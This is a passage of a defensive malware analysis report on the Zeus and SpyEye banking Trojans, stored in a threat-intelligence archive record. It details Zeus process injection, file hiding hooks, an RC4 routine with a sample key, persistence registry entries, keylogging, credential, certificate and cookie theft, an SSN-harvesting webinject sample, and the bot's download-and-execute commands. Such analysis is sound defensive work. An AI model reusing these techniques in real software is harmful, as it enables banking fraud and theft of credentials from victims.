PROCESS_BASIC_INFORMATION.UniqueProcessId field is zero\n(which is seen on earlier versions of Windows during creation of a new process), this\nimplies that the thread being created is the first thread of the new process and hijacking\nproceeds; otherwise, the bot uses CreateToolhelp32Snapshot, Thread32First, and\nThread32Next to enumerate all threads on the system, and ensures that none has a\nTHREADENTRY32.th32OwnerProcessID that matches the new process'\nPROCESS_BASIC_INFORMATION.UniqueProcessId before proceeding.\n\nThe bot image is then copied into the process (discussed in detail below) and the\nCONTEXT.Eax field of the new thread's context is changed so that it points to a thread\nroutine in the copied bot image.\n\n**Note  When creating a new process, KERNEL32 uses the Eax field to store a pointer to**\nthe application's entry point.\n\nThe other method of process injection involves enumerating processes of a given name\nthat are running as the current user, copying the bot image into each matching process,\nand injecting a thread using RtlCreateUserThread to execute a separate thread routine.\nThe bot:\n\n1. Enumerates processes by calling CreateToolhelp32Snapshot, Process32FirstW,\nand Process32NextW.\n\n2. Obtains the application path and file name of each using\nOpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ) and\nGetModuleFileNameExW(NULL).\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n3. Compares the user name—against which each matching process is running to the\nresult of GetUserNameW—by calling OpenProcessToken(TOKEN_QUERY),\nGetTokenInformation(TokenUser), and LookupAccountSidW.\n\nIf the process path matches the result of SHGetSpecialFolderPathW(CSIDL_WINDOWS or\nCSIDL_SYSTEM), if its application name matches winlogon.exe or explorer.exe, and if\nthe process' user names matches the result of GetUserNameW, the bot copies itself into and\ncreates a new thread in the process.\n\nIn both cases, the bot copies itself by locating its own image base—it starts at a pointer\nwithin itself, rounds down to the next 64KB boundary, then goes backward 64KB at a time\nuntil it locates a valid MZ signature, PE signature, and\nIMAGE_NT_HEADERS32.OptionalHeader.SizeOfImage field—then allocating a heap block\nof size SizeOfImage and copying its entire image into the heap block.\n\nNext, the bot applies relocations to itself, taking into consideration that relocations already\nhave been applied—that is, the pointers must be adjusted by the difference between the\nsource base address and IMAGE_NT_HEADERS32.OptionalHeader.ImageBase. A region of\nsize SizeOfImage is allocated in the target process using VirtualQueryEx('ImageBase',\nMEM_RESERVE, PAGE_NOACCESS) if possible or VirtualQueryEx(NULL, MEM_RESERVE,\nPAGE_NOACCESS) if the first attempt fails.\n\nThe headers of size IMAGE_NT_HEADERS32.OptionalHeader.SizeOfHeaders are copied\ninto the process using VirtualAllocEx(MEM_COMMIT, PAGE_READWRITE),\nWriteProcessMemory, and VirtualProtectEx(PAGE_READONLY) then each section is\ncopied using VirtualAllocEx(MEM_COMMIT, PAGE_READWRITE), WriteProcessMemory,\nand VirtualProtectEx(PAGE_EXECUTE_READWRITE).\n\n### Hidden Files Zeus creates the following hidden files:\n\n\\windows\\system32\\lowsec\\user.ds - stored keystrokes and image\ndata\n\n\n\\windows\\system32\\lowsec\\local.ds - retrieved configuration data\n\n\n\\windows\\system32\\lowsec\\user.ds.lll\n\n\n\\windows\\system32\\lowsec\\sdra64.exe - encrypted bot executable\n\n\nThe files are hidden on disk because of an API hook to the function\nNtQueryDirectoryFile. The original NtQueryDirectoryFile function is called and the\nresults are then filtered to hide the necessary files.\n\nThis is accomplished by comparing the returned file names to the list of files Zeus wants\nhidden. The file name is then hidden by setting the value of NextEntryOffset from the\n_FILE_NAMES_INFORMATION structure to NULL.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\ntypedef struct _FILE_NAMES_INFORMATION {\n\n\nULONG NextEntryOffset;\n\n\nULONG FileIndex;\n\n\nULONG FileNameLength;\n\n\nWCHAR FileName[1];\n\n\n} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;\n\n\nif (file_matches)\n\n\n{\n\n\n// Check for end of list\n\n\nif (pCurrentFileNames->NextEntryOffset == 0)\n\n\n{\n\n\n// Hide current file\n\n\nif (pPrev)\n\n\npPrevFileNames->NextEntryOffset = 0;\n\n\nelse\n\n\nreturn STATUS_NO_SUCH_FILE;\n\n\n### File Encryption\nThe configuration and storage files are not only hidden because of the\nNtQueryDirectoryFile hook, but they also are encrypted with the RC4 cipher. The 256byte RC4 key is specific to each bot creation, so it is impossible to create a universal\ndecrypter for the storage files. The RC4 key is stored within the encrypted executable and\nmust be extracted from an unpacked copy of the file.\n\nThe following code contains the reversed function that encrypts/decrypts the log and\nconfiguration data—the RC4 key must be extracted from the bot sample whose files you\nwish to analyze. The full decrypter software is available on request.\n\n\nint rc4(BYTE* buffer, DWORD length)\n\n\n{\n\n\nBYTE rc4key[258]=\n\n\n{\n\n\n0x67, 0xE9, 0x30, 0x10, 0x3D, 0xC3, 0x63, 0xE2, 0x9C, 0x6F,\n0xCD, 0xCC, 0x4F, 0xD0, 0xCB, 0x04,\n\n0xD9, 0xB7, 0xA0, 0x2A, 0xA3, 0x13, 0xB4, 0x6A, 0x8D, 0xD8, 0x25,\n0x2E, 0x22, 0xB8, 0x3A, 0xB0,\n\n0x27, 0x35, 0xFC, 0x26, 0x2B, 0x08, 0x8B, 0x8A, 0xAA, 0x69,\n0x78, 0x8C, 0x84, 0x47, 0x56, 0xCF,\n\n\n0x5D, 0xF6, 0x62, 0xAD, 0x8E, 0xD3, 0x7A, 0x58, 0x03, 0x70,\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\n0x4A, 0x45, 0x4D, 0x88, 0x7D, 0x93,\n\n\n0x28, 0x4E, 0x07, 0x51, 0x41, 0xD2, 0x54, 0x20, 0x3E, 0xA6,\n0x1C, 0xA9, 0x49, 0x6C, 0x23, 0xB2,\n\n0x86, 0x52, 0x32, 0xAE, 0xB3, 0x97, 0xBE, 0xBA, 0xDC, 0xC5,\n0xCE, 0x0D, 0x0A, 0x43, 0xE4, 0x7E,\n\n0x65, 0x95, 0xF8, 0xF2, 0xE1, 0xAB, 0x98, 0x71, 0x64, 0x7B,\n0x44, 0x1B, 0x3F, 0x76, 0xF3, 0xD4,\n\n0xA8, 0x29, 0x92, 0x6E, 0x18, 0x60, 0x46, 0x91, 0x3B, 0x09,\n0xBF, 0x4B, 0x99, 0x87, 0xB5, 0x17,\n\n0xDA, 0xC6, 0x0C, 0xDD, 0x34, 0xEF, 0x2F, 0xE6, 0x90, 0x79,\n0xBC, 0xF4, 0xF9, 0x9A, 0x6B, 0x5C,\n\n0x9E, 0x02, 0xEC, 0xE7, 0x80, 0x9D, 0xFD, 0x5A, 0x42, 0x05,\n0xA2, 0x74, 0xE3, 0x01, 0x06, 0xC2,\n\n0x1E, 0x16, 0xC7, 0x21, 0x12, 0xEB, 0xF0, 0xD6, 0x81, 0x3C,\n0x96, 0xFE, 0xC0, 0xE8, 0xC1, 0x2D,\n\n0x15, 0x5F, 0x5B, 0x31, 0x14, 0xC4, 0xEA, 0xE5, 0xEE, 0x6D,\n0xA1, 0x53, 0x73, 0xAC, 0x00, 0x8F,\n\n0xC8, 0x68, 0x1D, 0x33, 0xFB, 0xED, 0x85, 0xD5, 0xFF, 0x89,\n0xCA, 0x0B, 0xD1, 0x61, 0xA7, 0x7C,\n\n0xA4, 0x57, 0x40, 0xBD, 0xE0, 0x9B, 0x1F, 0xDF, 0xD7, 0x59,\n0xB6, 0x66, 0x77, 0x48, 0xB1, 0xAF,\n\n0x2C, 0x94, 0x24, 0xDB, 0x4C, 0xF5, 0x82, 0x39, 0xBB, 0xA5,\n0x1A, 0x38, 0x36, 0xF1, 0x0E, 0x0F,\n\n0x83, 0xF7, 0x75, 0xB9, 0x72, 0x9F, 0x5E, 0xFA, 0x11, 0xC9,\n0xDE, 0x19, 0x7F, 0x37, 0x55, 0x50,\n\n\n0x00, 0x00};\n\n\nDWORD counter;\n\nBYTE * keybuf;\n\n\nBYTE encbyte;\n\n\nBYTE * keyptr;\n\n\nBYTE byMask;\n\n\nBYTE byCounter;\n\n\nbyCounter = *(BYTE *)(rc4key + 256);\n\n\ncounter = 0;\n\n\nbyMask = *(BYTE *)(rc4key + 257);\n\n\nif ( length )\n\n\n{\n\n\ndo\n\n\n{\n\n\n++byCounter;\n\n\nkeybuf = byCounter + rc4key;\n\n\nencbyte = *(BYTE *)keybuf;\n\nbyMask += *(BYTE *)keybuf;\n\n\nkeyptr = rc4key + byMask;\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\n*(BYTE *)keybuf = *(BYTE *)keyptr;\n\n\n*(BYTE *)keyptr = encbyte;\n\n\n*(BYTE *)(counter++ + buffer) ^= *(BYTE *)(((encbyte +\n*(BYTE *)keybuf) & 0xFF) + rc4key);\n\n\n}\n\n\nwhile ( counter < length );\n\n\n}\n\n\n*(BYTE *)(rc4key + 256) = byCounter;\n\n\n*(BYTE *)(rc4key + 257) = byMask;\n\n\nreturn 0;\n\n\n}\n\n\n### Mutexes\nEach Zeus infection creates a mutex with the name _AVIRA_2109, so Zeus can be detected\nby attempting to open the mutex _AVIRA_2109.\n\n\nret = OpenMutex(0x1F0001, 0, L\"_AVIRA_2109\");\n\n\nif (ret)\n\n\n{\n\n\nCloseHandle(ret);\n\n\nresult = 1; // Zeus Found\n\n\n}\n\n\nelse\n\n\n{\n\n\nresult = 0; // Zeus not found\n\n\n}\n\n\nreturn result;\n\n\nZeus also creates a named pipe that is used for issuing commands to the running bot. An\ninteresting feature that the builder utilizes comprises an option for Trojan removable: the\nbuilder sends a command to the named pipe that instructs the bot to remove all traces of\nmalware from the computer. Third-party applications also can take advantage of the named\npipe for removing infected installations.\n\nThe following code illustrates documentation on the commands that the builder utilizes:\n\n\n// Commands accepted over named pipe (pipecommand):\n\n\n// 0x01 - returns the bot version\n\n\n// 0x02 - returns the name of the bot\n\n\n// 0x03 - issues command to bot to remove all traces of itself\nfrom the system, a reboot is required\n\n\n// for complete disinfection (handy!)\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\n// 0x0b - return path of bot\n\n\n// 0x0c - return path of config file local.ds\n\n\n// 0x0d - return path of config user.ds\n\n\nDWORD send_pipe_command(DWORD pipecommand, LPDWORD responsebuf,\nLPDWORD bytesread)\n\n\n{\n\n\nHANDLE hPipe;\n\n\nLPVOID buff;\n\n\nBOOL skipfunc = 1;\n\n\nDWORD ret = -1;\n\n\nWCHAR namepipe = L\"\\\\\\\\.\\\\pipe\\\\_AVIRA_2109\";\n\n\nDWORD nNumberOfBytesToWrite;\n\n\nDWORD nNumberOfBytesToRead;\n\n\nDWORD NumberOfBytesRead;\n\n\nDWORD tmp;\n\n\nwhile (1)\n\n\n{\n\n\nhPipe = CreateFileW(namepipe, 0xC0000000, 3, 0, 3, 0,\n0);\n\n\nif (hPipe != -1)\n\n\nbreak;\n\n\nif(!skipfunc)\n\n\nreturn ret;\n\n\nWaitNamedPipeW(namepipe, 0xFFFFFFFF);\n\n\nskipfunc = 0;\n\n\n}\n\n\nNumberOfBytesRead = 2;\n\n\nif ( SetNamedPipeHandleState(hPipe, &NumberOfBytesRead, 0, 0)\n\n&& WriteFile(hPipe, &pipecommand, 4, &NumberOfBytesRead, 0)\n\n&& WriteFile(hPipe, &nNumberOfBytesToWrite, 4,\n&NumberOfBytesRead, 0)\n\n&& WriteFile(hPipe, 0, nNumberOfBytesToWrite,\n&NumberOfBytesRead, 0)\n\n\n&& ReadFile(hPipe, &ret, 4, &NumberOfBytesRead, 0)\n\n\n&& NumberOfBytesRead == 4 )\n\n\n{\n\n\nnNumberOfBytesToRead = 0;\n\n\nif ( !ReadFile(hPipe, &nNumberOfBytesToRead, 4,\n&NumberOfBytesRead, 0) || NumberOfBytesRead != 4 )\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\n{\n\n\nret = -1;\n\ngoto die;\n\n\n}\n\n\nif (nNumberOfBytesToRead > 0)\n\n\n{\n\n\nbuff = HeapAlloc(nNumberofBytesToRead);\n\n\nif ( buff\n\n\n&& ReadFile(hPipe, buff, nNumberOfBytesToRead,\n&NumberOfBytesRead, 0)\n\n&& (tmp = nNumberOfBytesToRead, nNumberOfBytesToRead ==\nNumberOfBytesRead) )\n\n\n{\n\n\n*responsebuf = (DWORD)buff;\n\n\n*Size = tmp;\n\n\ngoto die;\n\n\n}\n\n\n}\n\n\nelse\n\n\n{\n\n\nret = -1;\n\n\n}\n\n\nHeapFree(buff);\n\n\ngoto die;\n\n\n}\n\n\ndie:\n\n\nCloseHandle(hPipe);\n\n\nreturn ret;\n\n\n}\n\n\nAdditional mutexes and named pipes for means of detection:\n\n - _AVIRA_2110\n\n - _AVIRA_2101\n\n - _AVIRA_2108\n\n - _AVIRA_2109\n\n - _AVIRA_21099\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n### Registry Entries\nZeus makes registry changes to ensure that the sdra64.exe dropper is executed upon\nstartup.\n\n\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n\n\nAdded:  \"Userinit\" =\n\"C:\\WINDOWS\\system32\\userinit.exe,C:\\WINDOWS\\system32\\sdra64.exe\"\n\n\nThe following executes without Administrator rights:\n\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n\nAdded:  \"Userinit\" = \"C:\\Documents and\nSettings\\user\\Application Data\\sdra64.exe\"\n\n### FTP and POP3 Credential Theft\nThe bot's hooks on imports of Winsock sending functions check each sent buffer for a casesensitive USER or PASS command and associate any such string found—up to the next\ncarriage return or line feed character—with the socket handle in an internal table.\n\nWhen a CWD, PWD, TYPE, FEAT, PASV, STAT, or LIST command is intercepted—and if a user\nname and password both already have been collected for the socket—a string is\nconstructed and logged with the form protocol://user:password@nnn.nnn.nnn.nnn/,\nwhere:\n\n   - protocol is pop3 if a STAT or LIST command were intercepted (even though these\nalso are valid FTP commands); otherwise it is ftp.\n\n   - user and password are the credentials logged when the USER and PASS commands,\nrespectively, are intercepted.\n\n   - nnn.nnn.nnn.nnn is the IPv4 address of the remote host, obtained using\ngetpeername.\n\nAnonymous FTP logins (where username case-sensitivity matches anonymous) to Internetroutable IPv4 addresses—that is, any address except 10.x.x.x, 192.168.x.x, 172.[16-31].x.x,\nand, 127.0.x.x—are not recorded.\n\n### Server Response Format\nBased on an analysis of the server's gate.php, the generic server response format\nappears to be:\n\n\n(header, referred to as \"BinCfg::HEADER\"; size is 'HEADER_SIZE' =\n\n\n28 or 1Ch bytes)\n\n\n+0000h LONG  total length of response\n\n\n+0004h LONG  ?\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\n+0008h LONG  \"reply count\"\n\n\n+000Ch [10h]  \"BinCfg::HEADER.MD5Hash\"; MD5 hash of\nfollowing data\n\n\n(data; composition varies)\n\n\n+001Ch [10h]  \"BinCfg::ITEM\"? (size is 'ITEM_HEADER_SIZE' =\n16\n\n\nor 10h bytes)\n\n\n+002Ch [...]  additional data\n\n\nAll fields are in little-endian byte order and responses are RC4-encrypted using the RC4\nfunction of system/global.php, supplied with the BOTNET_CRYPTKEY encryption key.\n\nZeus botnet server responses might be identified by considering that the Content-Length of\nall responses will be at least 28 or 1Ch bytes in length and that—assuming the key does\nnot change between responses—the first four bytes of data, when XORed by the ContentLength, should typically yield the same four bytes of keystream.\n\nFor example, if Message A has a Content-Length of 44 (2Ch) (and its first four bytes are 86\nBB CC DD) and Message B has Content-Length 80 (50h) (and its first four bytes are FA BB\nCC DD) then XORing either message's first four bytes by its Content-Length yields AA BB\nCC DD. This relationship among messages might assist with programmatically identifying\nresponses from a Zeus botnet server.\n\n### Key Logger and Screen Scraper\nZeus implements its key logging and screen scraping by way of an import hook to the API\nuser32!TranslateMessage.\n\nThe hook first checks the MSG structure for the Windows message WM_LBUTTONDOWN. If the\nuser has pressed the left mouse button, a global flag that is set within the\nHttpSendRequestA hook is then checked to determine whether the user is currently visiting\na banking site defined within the bot's configuration file—this is to ensure that screen\ncaptures are taken only of online banking sessions. If the global flag is set, Zeus captures a\nbitmap of the current screen by using the standard WIN32 bitmap functions.\n\n\nHDC hDC = CreateCompatibleDC(0);\n\n\nHBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), screen_width,\nscreen_height);\n\n\nSelectObject(hDC, hBmp);\n\n\nBitBlt(hDC, 0, 0, screen_width, screen_height, x_coordinate,\ny_coordinate, SRCCOPY);\n\nThe image is then converted to a JPEG stream by way of the GDI library functions and is\nsaved in a memory buffer. The image filename is created by concatenating the processid\nand a random, four-byte string; for example, screens\\unknown\\0310_07403EC4.jpg.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nThe JPEG stream is not written directly to disk; rather, it is encrypted and then\nconcatenated into the hidden data file \\windows\\system32\\lowsec\\user.ds, with the file\nlocation being dependent on the bot creator's configuration.\n\nIf the hook code does not detect a left mouse button press, it then checks for the Windows\nmessage WM_KEYDOWN. If a key has been pressed, the function GetKeyState is called to\ndetermine whether the CTRL or ALT keys have been pressed and exits the function if so.\nGetKeyboardState is then called to get the status of all virtual keys. The function\nToUnicode is called to convert the virtual keycode state to the corresponding Unicode\ncharacter or characters. The key buffer also is saved to the hidden data file. Key logging,\nlike screen scraping, takes place only when Zeus detects a URL of interest.\n\nThis is a creative approach to implementing a key logger and IOActive assumes it was\ncreated as an alternative to the easily-detectable SetWindowsHookEx function.\n\nIn addition, Zeus also hooks the function GetClipBoardData:\n\n\nHANDLE hClip = GetClipboardData(uFormat);\n\n\nif ( hClip )\n\n\n{\n\n\nif ( uFormat == CF_TEXT || uFormat == CF_UNICODETEXT||\nuFormat == CF_OEMTEXT )\n\n\nSaveDataToStore();\n\n\nelse\n\n\ngoto die;\n\n\n}\n\n\nIf the clipboard data contains text, it is saved to the encrypted log file; otherwise, the\nfunction returns normally.\n\n### Certificate Stealing\nOne of Zeus' interesting features is its ability to steal the certificate store, including private\nkeys, by hooking the function PFXImportCertStore. This function imports a PFX BLOB\nand returns the handle of a store that contains certificates and any associated private keys.\nOnce PFXImportCertStore has been called with the correct authentication, the function\nreturns with a handle to the certificate store and available private keys, which Zeus then\nsaves in the user.ds file.\n\n### Browser Injection and Hijacking\nAt the core of Zeus' functionality is its ability to hijack banking sessions and inject custom\ndata into returned HTML. The data to be injected is specified within the webinjects.txt\nfile, which is later built into the zeus configuration file.\n\nExample injection:\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\nset_url https://www.xxx.com/evaluate GP\n\n\ndata_before\n\n\nclass='full_name' maxlength='40' /></div>\n\n\ndata_end\n\n\ndata_inject\n\n\n<div class='text'><label>SSN:<span\nclass='req'>*</span></label><input type=\"text\" name='ssn'\nclass='email' maxlength='11' /></div>\n\n\ndata_end\n\n\ndata_after\n\n\n<div class='text' id='email_wrapper'>\n\n\ndata_end\n\n\nIn this case, when visiting the Company evaluation page, additional data is injected into the\nHTML, which adds a form to enter a social security number. The HTML injection is\nperformed by hooking the following wininet functions:\n\nwininet.dll!HttpSendRequestW\n\nwininet.dll!HttpSendRequestA\n\n\nwininet.dll!HttpSendRequestExW\n\nwininet.dll!HttpSendRequestExA\n\n\nwininet.dll!InternetReadFile\n\n\nwininet.dll!InternetReadFileExW\n\nwininet.dll!InternetReadFileExA\n\n\nwininet.dll!InternetQueryDataAvailable\n\n\nwininet.dll!InternetCloseHandle\n\n\nwininet.dll!HttpQueryInfoA\n\nwininet.dll!HttpQueryInfoW\n\nThe fact that Zeus hooks by way of wininet.dll limits the injection to browsers that utilize\nthese functions, which means that Internet Explorer sessions will be vulnerable to injection,\nbut Firefox will not. A new version of Zeus that includes support for Firefox apparently is\nundergoing beta testing.\n\nDuring the HttpSendRequest* hook routines, the bot creates an association between the\nHINTERNET handle used to send the request and the URL to which the request was sent—\nin addition to all web injection rules (read by the bot builder from WebInjects.txt and\nrecorded in binary form in the bot's config.bin configuration file) relating to that URL—in\nan internal table.\n\nLater, during the InternetReadFile* hook routines, the bot accesses the internal table—\nagain using the HINTERNET handle as the key—and retrieves the web injection entries,\naccording to which it processes the real data it receives by way of its own call to\nInternetReadFileExA. The handle also is associated with a buffer where the bot\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nmaintains its own copy of the real, received data, which is modified according to any\nmatching web injection rules not marked as log-only.\n\n**Note  Hooked calls to InternetReadFile* actually receive modified data from the bot**\nout of this buffer.\n\nAfter injection, HttpSendRequestA sets a flag that, when read by the TranslateMessage\nhook, saves the screen in JPEG form and the session keystrokes in the format\n<URL>\\nReferer: -\\nKeys: <keystrokes>\\r\\nData:\\n\\n<postdata>. Refer to Figure\n1.\n\nImage redacted due to confidentiality.\n\n_Figure 1_\n\n### Cookie Stealing\nZeus calls the function InternetGetCookie to retrieve cookies for the specified URL; the\ncookie data is then logged to the user.ds file.\n\n### Available Zeus Commands\nThe following commands can be issued from the server to the Zeus bot. Once each\ncommand is received, the command index number is used as a parameter to the\nsend_pipe_command() function, which has been previously documented.\n\n\nreboot  : Reboot computer.'\n\n\nkos   : Kill OS.\n\n\nshutdown : Shutdown computer.\n\n\nbc_add [service] [ip] [port] : Add backconnect for [service]\nusing server witn address [ip]:[port].,\n\nbc_del [service] [ip] [port] : Remove backconnect for [service]\n(mask is allowed) that use connection to [ip]: [port] (mask is\nallowed).\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\nblock_url [url]  : Disable access to [url] (mask is allowed).\n\n\nunblock_url [url] : Enable access to [url] (mask is allowed).\n\n\nblock_fake [url]  : Disable executing of HTTP-fake/inject with\nmask [url] (mask is allowed).\n\nunblock_fake [url] : Enable executing of HTTP-fake/inject with\nmask [url] (mask is allowed).\n\nrexec [url] [args]  : Download and execute the file [url] with\nthe arguments [args] (optional).\n\nrexeci [url] [args] : Download and execute the file [url] with\nthe arguments [args] (optional) using interactive user.\n\nlexec [file] [args] : Execute the local file [file] with the\narguments [args] (optional).\n\nlexeci [file] [args] : Execute the local file [file] with the\narguments [args] (optional) using interactive user.\n\naddsf [file_mask...] : Add file masks [file_mask] for local\nsearch.\n\ndelsf [file_mask...] : Remove file masks [file_mask] from local\nsearch.\n\n\ngetfile [path]    : Upload file or folder [path] to server.\n\n\ngetcerts     : Upload certificates from all stores to\nserver.\n\nresetgrab     : Upload to server the information from the\nprotected storage, cookies, etc.\n\nupcfg [url]    : Update configuration file from url [url]\n(optional, by default used standard url,\n\n\nrename_bot [name] : Rename bot to [name].\n\n\ngetmff      : Upload Macromedia Flash files to server.\n\n\ndelmff      : Remove Macromedia Flash files.\n\n\nsethomepage [url] : Set homepage [url] for Internet Explorer.\n\n\nOne important feature of the Zeus bot is the ability to download and execute files from a\nremote location. This gives Zeus the ability to extend its framework, or install additional\nmalware.\n\nDetailed analysis of the command internals was found to be unwarranted because they did\nnot reveal any unique bot characteristics. The important commands allowed IOActive to\nretrieve encrypted data store files, execute local files, and disable injection based on URL.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n# Conclusion\n\nThe combined analysis of both the Zeus and SpyEye Trojans offers an internal look into the\nmethods that are common to most popular banking Trojans. The level of detail documented\nhere provides Company with the opportunity to prevent the underlying functionality of\ncommon malware, rather than basing detection and prevention on individual agents.\n\nZeus and other malware instances offer many distinct detection methods, but the fact that\nCompany integrates a VM offers a unique ability to implement protection that covers an\nentire range of malware and malware techniques. IOActive recommends physical/virtual\nmemory monitoring, which—with the proper implementation—could prevent unwanted\nhooks and process injection. Having control of the VM offers a great opportunity for systemwide memory page monitoring.\n\nIn addition, another distinct advantage to the virtualized solution is in being able to apply\nstatic analysis on the image before its execution. Simple entropy analysis on PE code\nsections, or the detection of suspicious sections, would offer a quick and easy way to\ndetermine a persistent malware infection.\n\nIn addition to this report, decrypted configuration files, decrypter tools, and unpacked\nversions of the Zeus agent are available on request.\n\n**Key-logging Notes**\n\nA common method used by banking malware is to hook the keyboard with a ring-3\nTranslateMessage. Malware typically triggers the key-logging ability when the user is\nengaged in an online banking session. It should be noted that other key-logging methods,\nsuch as the API SetWindowsHookEx or a kernel-level filter hook, would allow system-wide\nkey-logging.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n# References\n\n[1] Koehl, Ben, and Jorge Mieres. \"SpyEye Bot (Part two): Conversations with the creator\nof crimeware.\" <http://www.malwareint.com/docs/spyeye-analysis-ii-en.pdf>.\n\n[2] Zeilenga, Kurt D. \"RFC 4616: The PLAIN Simple Authentication and Security Layer\n(SASL) Mechanism.\" <http://www.ietf.org/rfc/rfc4616.txt>.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        }
    ],
    "references": [
        "https://ioactive.com/pdfs/ZeusSpyEyeBankingTrojanAnalysis.pdf"
    ],
    "report_names": [
        "ZeusSpyEyeBankingTrojanAnalysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041167,
    "ts_creation_date": 1326286590,
    "ts_modification_date": 1326286590,
    "files": {
        "pdf": "https://archive.orkl.eu/19f7e688091f5b60f9446a9bb517f6711da9f2bb.pdf",
        "text": "https://archive.orkl.eu/19f7e688091f5b60f9446a9bb517f6711da9f2bb.txt",
        "img": "https://archive.orkl.eu/19f7e688091f5b60f9446a9bb517f6711da9f2bb.jpg"
    }
}